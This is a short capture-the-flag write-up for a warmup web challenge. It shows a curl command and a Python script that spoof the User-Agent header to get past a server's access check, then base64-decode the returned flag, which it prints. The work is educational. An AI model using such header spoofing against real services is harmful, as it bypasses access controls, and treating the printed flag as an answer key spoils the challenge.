# web-starter

**Category**: warmup

**Points**: 50

web exp time

http://195.154.231.70:2345

## Solution

reading the source code you can find the line `	<!-- TODO: only let in Samsung Smart Fridge 2.0 -->`

pressing the button makes a request to `/ctfimg`, with the error code `ay, you're not a fridge!`

so, simply change the user agent to `Samsung Smart Fridge 2.0` and you get the flag.

```bash
curl -X POST -H "User-Agent: Samsung Smart Fridge 2.0" http://195.154.231.70:2345/ctfimg
```

this gets you back the output `Flag: ZFc1eVpXRnNlM1IzYVhSMFpYSmZabTl5WDNOaGJYTjFibWRmYzIxaGNuUmZabkpwWkdkbGZRPT0=`

base64 decode it twice and you get the flag.

```python
import base64
import requests

url = "http://195.154.231.70:2345//ctfimg"
user_agent = "Samsung Smart Fridge 2.0"

resp = requests.post(url, headers={"User-Agent": user_agent})
text = resp.text.split("Flag:")[1].strip()
decoded_text = base64.b64decode(base64.b64decode(text))  # double base64 decode
print(decoded_text.decode("utf-8")) # unreal{twitter_for_samsung_smart_fridge}
```
